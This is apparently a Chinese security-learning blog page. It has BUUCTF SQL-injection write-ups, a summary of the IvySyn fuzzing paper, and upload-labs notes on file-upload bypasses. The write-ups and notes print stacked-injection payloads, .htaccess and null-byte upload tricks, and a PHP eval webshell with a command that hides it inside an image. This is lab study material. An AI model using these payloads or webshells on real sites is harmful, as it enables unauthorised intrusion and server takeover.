<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f5ed71-751c-4117-9195-f3178caa3dd2" alt="image"></p>
<p>爆表名：1’; show tables;#</p>
<p>出来了两个表</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f636bbac-e56c-4091-bf74-ebe0f39634cf" alt="image"></p>
<p>查看words表列名：1’; show columns from words;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6bdf874f-d98f-49ee-a0e6-b5a1df7495b0" alt="image"></p>
<p>查看1919810931114514表列名：0’; show columns from <code>1919810931114514</code>;#</p>
<p>注意：表名为数字时，要用反引号包起来查询</p>
<p>看到flag，说明表1919810931114514中有flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1be25d80-699d-4449-981a-4ba85f3228b3" alt="image"></p>
<p>查看大佬的方法</p>
<ul>
<li><p>通过 rename 先把 words 表改名为其他的表名。</p>
</li>
<li><p>把 1919810931114514 表的名字改为 words 。</p>
</li>
<li><p>给新 words 表添加新的列名 id 。</p>
</li>
<li><p>将 flag 改名为 data </p>
<p>1’; rename table words to word1; rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/595a5ad4-0393-4542-9b16-f32cd7633903" alt="image"></p>
</li>
</ul>
<p>最后输入：1’ or 1&#x3D;1;#</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b2b3bcda-a630-4c63-a614-a68ba770a02a" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa75e48d-8389-408e-9c8c-9d30c81c432b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="8、EasySQL"><a href="#8、EasySQL" class="headerlink" title="8、EasySQL"></a>8、EasySQL</h4><p>输入1，有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24aa574b-2e43-454e-8df1-8dbb3b104abd" alt="image"></p>
<p>爆数据库：1;show databases;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0320260a-c0f9-4e36-b544-bb0ba53de8a0" alt="image"></p>
<p>爆表：1;show tables;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee2d1ebd-03b9-48f9-984f-10acee8da107" alt="image"></p>
<p>爆字段：1;show columns from FLAG;#</p>
<p>显示Nonono</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faaaf7dd-fd3e-4fe1-8eb9-2c66d9b23046" alt="image"></p>
<p>查看大佬博客后，构造payload：*,1</p>
<p>参考博客（[BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a>）</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9321cfe6-b625-4707-9703-8ecbdf5d1a9b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c0c6069-c1fe-4314-b793-9a214f11fdb3&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/14/20240214/" data-id="clsl9y38e0000usvf69u7b5aa" data-title="20240214" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-IvySyn Automated Vulnerability Discovery in Deep Learning Frameworks" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/" class="article-date">
  <time class="dt-published" datetime="2024-02-08T10:18:02.000Z" itemprop="datePublished">2024-02-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="IvySyn-Automated-Vulnerability-Discovery-in-Deep-Learning-Frameworks-论文分享"><a href="#IvySyn-Automated-Vulnerability-Discovery-in-Deep-Learning-Frameworks-论文分享" class="headerlink" title="IvySyn: Automated Vulnerability Discovery in Deep Learning Frameworks 论文分享"></a>IvySyn: Automated Vulnerability Discovery in Deep Learning Frameworks 论文分享</h3><p>Neophytos Christou, undefined., et al, “IvySyn: Automated Vulnerability Discovery in Deep Learning Frameworks,” in 32nd USENIX Security Symposium (USENIX Security 23), 2023, pp. 2383–2400.</p>
<p>pdf链接：<a href="">usenix.org&#x2F;system&#x2F;files&#x2F;usenixsecurity23-christou.pdf</a></p>
<p>IvySyn：自动发现深度学习框架中的漏洞</p>
<p>IvySyn是第一个用于发现深度学习框架中的内存错误漏洞的全自动框架，它会自动合成高级语言（如Python）中的代码片段</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>人工智能应用越来越广泛，深度学习（DL）一直走在人工智能技术的前沿。深度学习框架通常为模型开发人员提供一套丰富的高级应用程序接口，开发者可以通过这些接口执行特定的DL操作，但是这些操作的重要部分（内核）是用C&#x2F;C++等内存不安全语言实现的。因此DL框架底层实现存在漏洞，这些漏洞可能导致功能不正确、数值错误、性能下降、内存耗尽和CPU&#x2F;GPU&#x2F;TPU锁定，以及致命的的运行时和内存安全错误。</p>
<h4 id="现存的深度学习框架漏洞发现方法局限"><a href="#现存的深度学习框架漏洞发现方法局限" class="headerlink" title="现存的深度学习框架漏洞发现方法局限"></a>现存的深度学习框架漏洞发现方法局限</h4><p>过去了方法试图通过直接在高级应用程序接口上使用模糊处理来回答类似问题，但是是半自动或非自动的，需要领域专家注释来指定有效的参数-值组合，或者需要开发人员手动编写辅助代码。</p>
<h5 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h5><ol>
<li>在本地DL内核中，是否有低级应用程序接口的违规输入会引发内存错误？</li>
<li>是否有任何高级应用程序接口可以将上述违规输入传播到低级内核代码中？</li>
</ol>
<h4 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h4><ol>
<li>利用原生API的静态类型性质，这使本文能够在低级内核代码上执行基于类型感知突变的模糊</li>
<li>给定低级API的一组违规输入，本文利用从低级到高级API的固有DL框架映射，并合成代码片段，在低级、原生代码上触发内存错误，并将输入传递给高级API</li>
<li>设计并实现IvySyn，IvySyn框架中实现了本文自下而上的方法，它不需要域专家注释或手动编写的驱动程序代码</li>
</ol>
<h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><p><strong>内核</strong>：DL框架的核心功能由原生C&#x2F;C++代码提供，实现标准操作，如张量操作、数学、讨论和梯度计算、池化和其他DL特定操作。此类操作的实际本机实现称为内核。在C&#x2F;C++等语言中实现核心操作不仅提供了更好的性能，还允许框架开发人员为不同的硬件设备（例如CPU、GPU和TPU）提供多个优 化版本。内核被建议避免使用（或取决于）共享状态，每个调用都是自包含的，以便易于并行。这是IvySyn构建的一个重要属性，可以无缝添加其内核模糊钩子。</p>
<p><strong>绑定</strong>：即使DL框架提供低级内核API，模型开发人员通常通过Python等高级语言执行特定于DL的操作。因此，为了通过开发人员可访问的API公开这些操作的子集，DL框架生成高级绑定。这些绑定将喂给Python API的输入参数转换为相应的C&#x2F;C++参数，并透明地调用适当的内核，抽象出有关底层外函数接口的实现细节。IvySyn基于DL框架映射（绑定⇄内核）和低级崩溃输入，以无缝合成代码片段，包括各自的高级API。尽管这些绑定不一定打算由de-velopers使用，但它们仍然被公开曝光，并且可以从Python中调用，使攻击者能够直接访问本机内核实现中可利用的漏洞。</p>
<p><strong>高级API和DL模型</strong>：高级语言绑定（如上述）由其他特定于语言的高级API（例如，在Python中实现）进一步包装。在调用相应操作之前，后者可能会在原始绑定上添加一些抽象，例如参数的预处理或额外的健全性检查；或者可能只是包装器，向框架模块添加文档和统一导出操作。最终，围绕内核操作绑定的高级API是模型开发人员打算使用的API。我们称这些开发人员可访问和记录的API为高级API。通常，在为各种任务构建DL模型时，会使用多个此类高级API，例如自动驾驶汽车的图像分类[36]，恶意软件检测和人脸识别。测试深度学习框架。DL框架在其底层实现中存在错误，经验表明，此类错误可能会导致内存安全错误、致命的运行时错误、不正确或不一致的功能性、数值错误、性能下降、内存消耗和CPU&#x2F;GPU&#x2F;TPU锁定。原生、C&#x2F;C++、DL框架部分（例如内核）中的错误特别令人感兴趣，因为它们可能会导致致命的运行时错误和内存错误，并可能被攻击者滥用。</p>
<p><strong>内存错误</strong>：</p>
<p>IvySyn旨在发现触发以下内容的崩溃输入：</p>
<p>（a）内存安全错误，如（任意）内存损坏和内存泄露漏洞</p>
<p>（b）致命的运行时错误——（a）和（b）在模糊&#x2F;运行时期间表现为崩溃（即带有SIGABRT、SIGFPE和SIGSEGV异常的异常进程终止）。</p>
<h4 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h4><p>目标：发现安全漏洞</p>
<p>IvySyn利用基于突变的模糊测试和类型感知测试，实现发现本地DL内核中可能引发内存错误的违规输入。IvySyn会自动合成适当的代码片段，从高级应用程序接口触发相应的错误。</p>
<p>每一个可以触发内存错误的输入（代码片段）被称为“漏洞证明”（PoV），因为它正面内核代码中存在漏洞，可能导致内存损坏或泄露（违反完整性&#x2F;保密性），甚至停止整个DL框架的运行（违反可用性）。攻击者可以通过API触发漏洞。</p>
<h4 id="IvySyn框架"><a href="#IvySyn框架" class="headerlink" title="IvySyn框架"></a>IvySyn框架</h4><p>框架的设计遵循三个设计原则</p>
<ol>
<li>开发人员关于拓展DL框架的指令：便于识别本机API并为其添加适当的模糊钩子</li>
<li>挂钩没有共享状态的内核，使用开发人员测试来强制执行和模糊它们</li>
<li>利用高层和底层API之间固有的DL框架来合成PoV</li>
</ol>
<p>下图是IvySyn的整体架构</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/74ca5e10-38ab-485e-b509-1cec8155b9a5" alt="image"></p>
<p>IvySyn的仪器从各自的DL代码库中提取本机内核实现，以构建和注入模糊包装器。IvySyn的Watchdog调用开发人员测试套件的切入点；一旦ex-ecution的流到达目标内核，IvySyn的仪器将使用类型感知突变引导强制执行的基于突变的模糊会话。IvySyn的合成器使用模糊过程中发现的低级崩溃输入来生成PoV，这反过来又会触发来自公开可用API的低级内存错误。</p>
<p>要测试本机代码，IvySyn首先需要提取与DL框架内核对应的函数，然后在它们周围创建并注入适当的模糊包装器。</p>
<p><strong>Creating and Injecting Wrappers：</strong> 给定一组目标ker- nels，IvySyn创建并注入模糊包装器如下：首先，它将原始内核函数重命名，例如func()，改为do_func()；然后，它用包装代码替换原始函数的主体，初始化IvySyn模糊会话。</p>
<p>DL框架通常由多层结构组成，不会公开低级API（即内核）供直接使用。 图1的左侧，内核旨在被高级API暗示使用，高级API⇝绑定⇝内核。 因此，在没有适当的调用上下文（即在调用堆栈上活跃的特定功能链和一组正确初始化的全局变量）的情况下，直接模糊内核API将导致不正确的功能。</p>
<p>为了引导强制执行的模糊会话，IvySyn创建了一个看门狗进程，该进程运行开发人员提供的单元测试的入口点（例如，在TensorFlow的情况下，tf-tests&#x2F;*.py）。 在仪器期间，原始内核函数定义与IvySyn包装代码插入。 因此，一旦开发人员测试的执行到达仪器内核，它将启动一个“强制执行”的模糊会话。 这种方法可以无缝工作，因为强制执行的内核以适当的调用上下文调用，内核通常通过设计避免共享状态。 （与共享状态交互的内核目前被IvySyn忽略） 崩溃报告生成。 每个突变的投入组合都会被分配一个唯一的索引号（UIN）。 IvySyn将与当前突变输入组合对应的UIN记录到日志文件中，该日志文件以模糊的函数命名。 一旦发生崩溃，此日志文件将包含上次尝试输入组合的UIN，这是导致内存错误的UIN。 IvySyn利用这种形成来重新初始化模糊器，获取违规输入，并将崩溃报告拼接在一起，如Listing1所示。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7740b05f-0700-4f55-91fc-bb4aaf47107e" alt="image"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本位设计并实现了IvySyn，IvySyn首先识别DL内核代码实现，并添加模糊钩子，以便对类型感知突变执行基于突变的模糊。 接下来，给定一组崩溃的内核，它合成了传播违规输入的高级代码片段，这些代码片段会使本机内核崩溃，认为是高级API。此类代码片段可以作为漏洞的证明，并可以帮助开发人员复制、分析并最终修复各自的错误。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/" data-id="clscsnyfv0000vcvferw4ai99" data-title="IvySyn" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-File2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/07/Web-File2/" class="article-date">
  <time class="dt-published" datetime="2024-02-07T10:25:47.000Z" itemprop="datePublished">2024-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/07/Web-File2/">Web-File2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="Pass-03（黑名单绕过）"><a href="#Pass-03（黑名单绕过）" class="headerlink" title="Pass-03（黑名单绕过）"></a>Pass-03（黑名单绕过）</h5><p>trim函数 如果有空格，就把空格删除</p>
<p>这道题黑名单中有php，将文件后缀改为php5或phtml即可绕过</p>
<h5 id="Pass-04（黑名单绕过-htaccess攻击）。。。"><a href="#Pass-04（黑名单绕过-htaccess攻击）。。。" class="headerlink" title="Pass-04（黑名单绕过 .htaccess攻击）。。。"></a>Pass-04（黑名单绕过 .htaccess攻击）。。。</h5><p>上传.htaccess文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>文件名包含shana的会被当做php执行</p>
<p>可以把php文件命名为jpg文件，绕过黑名单，在网页访问该文件时，该文件会以php执行</p>
<h5 id="Pass-05（黑名单绕过-后缀双写逻辑绕过）"><a href="#Pass-05（黑名单绕过-后缀双写逻辑绕过）" class="headerlink" title="Pass-05（黑名单绕过 后缀双写逻辑绕过）"></a>Pass-05（黑名单绕过 后缀双写逻辑绕过）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名会转为小写，用双写绕过</p>
<p>后缀名改为.phpphp，上传成功</p>
<h5 id="Pass-06（黑名单绕过-大小写文件名混淆）"><a href="#Pass-06（黑名单绕过-大小写文件名混淆）" class="headerlink" title="Pass-06（黑名单绕过 大小写文件名混淆）"></a>Pass-06（黑名单绕过 大小写文件名混淆）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名不会统一转为小写，将文件后缀改成PHp（黑名单中没有），上传成功</p>
<h5 id="Pass-07（黑名单绕过-空格绕过）。。。"><a href="#Pass-07（黑名单绕过-空格绕过）。。。" class="headerlink" title="Pass-07（黑名单绕过 空格绕过）。。。"></a>Pass-07（黑名单绕过 空格绕过）。。。</h5><p>查看源码，发现跟之前源码相比，少了首位去空，抓包，在文件名最后加个空格，再forward，就上传成功</p>
<h5 id="Pass-08（黑名单绕过-填点绕过）。。。"><a href="#Pass-08（黑名单绕过-填点绕过）。。。" class="headerlink" title="Pass-08（黑名单绕过 填点绕过）。。。"></a>Pass-08（黑名单绕过 填点绕过）。。。</h5><p>查看源码，发现没有删除文件名末尾的点，抓包，在后面加个.，绕过</p>
<h5 id="Pass-09（黑名单绕过-Win文件流特性绕过）"><a href="#Pass-09（黑名单绕过-Win文件流特性绕过）" class="headerlink" title="Pass-09（黑名单绕过 Win文件流特性绕过）"></a>Pass-09（黑名单绕过 Win文件流特性绕过）</h5><p>查看源码，没有去除字符串::$DATA，抓包，在最后加上::$DATA，上传成功</p>
<h5 id="Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。"><a href="#Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。" class="headerlink" title="Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。"></a>Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。</h5><p>抓包，将文件名后缀改为.php.  .</p>
<p>首先去除空格，删除最后一个.</p>
<p>然后后缀名为.php.，绕过过滤，上传成功</p>
<h5 id="Pass-11（黑名单绕过-双写绕过）"><a href="#Pass-11（黑名单绕过-双写绕过）" class="headerlink" title="Pass-11（黑名单绕过 双写绕过）"></a>Pass-11（黑名单绕过 双写绕过）</h5><p>有一次过滤，将后缀名改为.pphphp，过滤完后缀名为.php，上传成功</p>
<h5 id="Pass-12（白名单绕过-00截断GET型绕过）"><a href="#Pass-12（白名单绕过-00截断GET型绕过）" class="headerlink" title="Pass-12（白名单绕过 00截断GET型绕过）"></a>Pass-12（白名单绕过 00截断GET型绕过）</h5><p>这段代码是防止多个点绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>白名单加防止多点绕过，需要用到%00截断，%00是在地址方面，0x00截断是在文件命名方面</p>
<p>例如文件名为1.php</p>
<p>只能上传.jpg后缀文件，代码将文件命名为 1.php.19283018.jpg，使其为一个jpg文件</p>
<p>如果加上%00截断，1.php%00.19283018.jpg，%00之后的就没有了，为1.php</p>
<p>抓包，在第一行的参数save_path&#x3D;..&#x2F;upload&#x2F;改为save_path&#x3D;..&#x2F;upload&#x2F;1.php%00，php版本换为5.2</p>
<p>第21天 1:32:03</p>
<h5 id="Pass-13（白名单绕过-00截断POST型绕过）"><a href="#Pass-13（白名单绕过-00截断POST型绕过）" class="headerlink" title="Pass-13（白名单绕过 00截断POST型绕过）"></a>Pass-13（白名单绕过 00截断POST型绕过）</h5><p>跟Pass-12类似，抓包，找到..&#x2F;upload的位置，写成..&#x2F;upload&#x2F;xx.php%00</p>
<p>但是这个%00需要编码，选中%00，右键</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faf6e2ef-ac59-4ee8-9d1f-7c48fedde799" alt="image"></p>
<h5 id="Pass-14（图片马-文件包含绕过）。。。"><a href="#Pass-14（图片马-文件包含绕过）。。。" class="headerlink" title="Pass-14（图片马+文件包含绕过）。。。"></a>Pass-14（图片马+文件包含绕过）。。。</h5><p>在图片中写入后门代码</p>
<p>php后门代码，将这个代码附加在图片后面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在cmd中运行copy 1.png &#x2F;b + a.php &#x2F;a webshell.jpg，得到webshell.jpg，可以看到图像最后加上了这一行php代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96294650-d853-473e-a855-68f648453a2c" alt="image"></p>
<p>获取上传的图片地址，右键图片，复制图像链接</p>
<p><a target="_blank" rel="noopener" href="http://192.168.182.1/upload/upload/8920230926111805.png">http://192.168.182.1/upload/upload/8920230926111805.png</a></p>
<p>点击题目中给的文件包含漏洞链接，加上参数，进行访问</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/009f3474-9108-4149-b8be-78ee5bb17aeb" alt="image"></p>
<p>再用post传参，x&#x3D;phpinfo();，可以执行php代码</p>
<h4 id="文件上传之后端黑白名单绕过"><a href="#文件上传之后端黑白名单绕过" class="headerlink" title="文件上传之后端黑白名单绕过"></a>文件上传之后端黑白名单绕过</h4><p>黑名单：明确不让上传的格式后缀</p>
<p>白名单：明确可以上传的格式后缀</p>
<p>如果黑名单中有PHP，可以用PHP5或Phtml来绕过限制</p>
<p>enctype：文件上传的类型</p>
<p>method：上传方式</p>
<p>onsubmit：鼠标触发事件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7179fdb4-ae78-4825-84f0-e1afdb7e190c" alt="image"></p>
<p>看下面的代码，PHP中接受文件的参数名要与HTML表单中的一致，以name的值发送过去，name的值是upload_file，所以上面也是upload_file</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; #接收文件上传</span><br><span class="line">echo $name</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctypt=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;/p&gt;</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>.htaccess，用apach才行</p>
<p>.htaccess是apach的一个配置文件，将.htaccess文件上传成功后，其余文件会依照.htaccess的执行</p>
<p>.htaccess示例</p>
<p>将这个文件上传成功后，再上传文件名中包含shana的文件，就会被当作x-httpd-php来执行</p>
<p>注意shana文件要和上传的.htaccess文件在同一目录</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>有的代码是一次过滤，有的是循环过滤</p>
<p>比如说，a.phphp，一次过滤之后为a.php</p>
<p>循环过滤（递归过滤） 过滤后为a.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/07/Web-File2/" data-id="clsaip1bn0000ncvf6hfaa4m1" data-title="Web-File2" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-File1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/06/Web-File1/" class="article-date">
  <time class="dt-published" datetime="2024-02-06T11:55:39.000Z" itemprop="datePublished">2024-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/06/Web-File1/">Web-File1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="搭建靶场-Vulhub"><a href="#搭建靶场-Vulhub" class="headerlink" title="搭建靶场 Vulhub"></a>搭建靶场 Vulhub</h5><p>开靶场</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">进入tomcat所在目录</span><br><span class="line">完整路径/home/fuzz/vulhub/tomcat/tomcat8</span><br><span class="line">cd vulhub/tomcat/tomcat8</span><br><span class="line">建立容器</span><br><span class="line">docker-compose build</span><br><span class="line">开启漏洞环境</span><br><span class="line">docker-compose up -d</span><br><span class="line">出现绿色的done就是创建好了</span><br><span class="line">查看本机ip</span><br><span class="line">ifconfig</span><br><span class="line">然后访问 </span><br><span class="line">http://your-ip:8080/manager/html</span><br></pre></td></tr></table></figure>

<p>关靶场</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在tomcat8目录下将靶场关掉</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

<h5 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h5><p>思路，要知道是那种类型的漏洞，如果不知道，就按照常规处理</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/388b9289-db0f-431e-8811-231a7fa3a35c" alt="image"></p>
<p>1、什么是文件上传漏洞？</p>
<p>只要有文件上传的地方，就有可能存在文件上传漏洞，要判断文件上传部分的代码是否写得完整，安全，要是存在疏忽，就有文件上传漏洞存在的可能</p>
<p>2、文件上传漏洞有哪些危害？</p>
<p>可以上传后门文件webshell，获取到当前网站权限，高危漏洞</p>
<p>3、文件上传漏洞如何查找及判断？</p>
<p>查找</p>
<p>①黑盒查找，对方的源码我们不知道，需要自己判断，可以通过扫描目录、敏感文件，有的字典中会有上传地址，通过扫描获取上传地址，或者在网站上给出的相关应用，比如说备案中心，一般可以上传图像</p>
<p>②白盒查找，有对方的源代码，可以分析源代码查找有无文件上传功能，文件上传地址</p>
<p>主要方法是扫描，寻找上传点</p>
<p>4、文件上传漏洞有哪些需要注意的地方？</p>
<p>要对文件上传的类型进行区分，比如说是利用编辑器，就搜索这个编辑器的相关漏洞，然后利用漏洞上传</p>
<p>文件上传常见验证：</p>
<p>后缀名，类型，文件头等</p>
<p>后缀名：黑名单，白名单</p>
<p>文件类型：MIME信息</p>
<p>文件头：内容头信息</p>
<h4 id="文件上传之过滤方式"><a href="#文件上传之过滤方式" class="headerlink" title="文件上传之过滤方式"></a>文件上传之过滤方式</h4><h5 id="upload靶场"><a href="#upload靶场" class="headerlink" title="upload靶场"></a>upload靶场</h5><h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aaron_miller/article/details/106143006">upload-labs靶场通关（文件上传漏洞靶场）_風月长情的博客-CSDN博客</a></p>
<p><strong>move_uploaded_file(file,newloc)</strong></p>
<ul>
<li>将上传的文件移动到新位置，通过HTTP POST上传文件，如果目标文件已存在，则会被覆盖</li>
<li>file：要移动的文件</li>
<li>newloc：规定文件的位置</li>
</ul>
<p><strong>unlink(file)</strong> </p>
<p>删除文件</p>
<p><strong>in_array(search,array)</strong></p>
<p>搜索数组中是否存在指定的值</p>
<p>一句话木马</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">&lt;?php eval($_POST[a];?&gt;</span><br></pre></td></tr></table></figure>

